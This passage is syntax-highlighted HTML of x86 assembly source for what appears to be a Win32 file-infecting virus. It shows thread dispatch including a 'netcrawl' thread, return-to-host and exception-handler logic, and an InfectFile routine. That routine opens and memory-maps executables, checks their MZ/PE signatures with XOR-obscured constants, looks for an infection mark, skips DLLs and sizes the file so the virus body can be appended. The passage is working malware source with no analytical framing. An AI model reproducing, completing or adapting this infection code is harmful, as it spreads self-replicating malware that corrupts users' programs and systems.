       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecover6</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRecover6</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecover6</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_thread6_seh</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exit_netcrawl</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_6_StartAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">OurThreads</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_1_StartAddress</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_2_StartAddress</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_3_StartAddress</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_4_StartAddress</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_5_StartAddress</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_6_StartAddress</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_seh</span><span class="sc0">                             </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ExceptionExit</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">err</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">err</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_over</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">err</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SEH Error!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">go_over</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_seh</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;returning to the host...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">                                     </span><span class="sc1">;restore delta handle</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">generation0_exit</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">APIHOOK</span><span class="sc0">                                  </span><span class="sc1">;if api hook is on we</span><span class="sc0">
</span><span class="sc5">apicheck</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;cannot return to host</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apihookfinish</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;until the hooking is</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">apicheck</span><span class="sc0">                                </span><span class="sc1">;done...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                          </span><span class="sc1">;mov eax, oledip</span><span class="sc0">
</span><span class="sc5">oldeip</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                          </span><span class="sc1">;add eax, imagebase</span><span class="sc0">
</span><span class="sc5">adjust</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">savedeax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">savedeax</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">generation0_exit</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitProcess</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;save regs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;mark success flag</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;save filename</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ValidateFile</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">failed_infection</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;get attributes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileattributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;and save them</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc1">; and set</span><span class="sc0">
                                                   </span><span class="sc1">;them normal</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,\
</span><span class="sc0">                         </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;open file</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finished</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileopen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filetime1</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;save file time</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileTime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;get file size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">additional</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;save additional length</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc4">,\
</span><span class="sc0">                                       </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">additional</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;create mapping object</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MapViewOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,\
</span><span class="sc0">                           </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">additional</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;map file!</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_map</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;save address of mapping</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;check exe sign</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'⁄ﬂ'</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'⁄ﬂ'</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitCopro</span><span class="sc0">                              </span><span class="sc1">;check infection mark</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_oeminfo</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;this is number a</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_oeminfo</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fmul</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RestoreCopro</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;get pointer to pe header</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_IsBadReadPtr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">;check readability</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">peheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;save pe header</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;check if pe file</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ı'</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'ı'</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc1">; be sure it's not</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;a library</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pedata</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NumberOfSections</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;save number of sections</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;save optional header</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">             </span><span class="sc1">;get to the optional head.</span><span class="sc0">
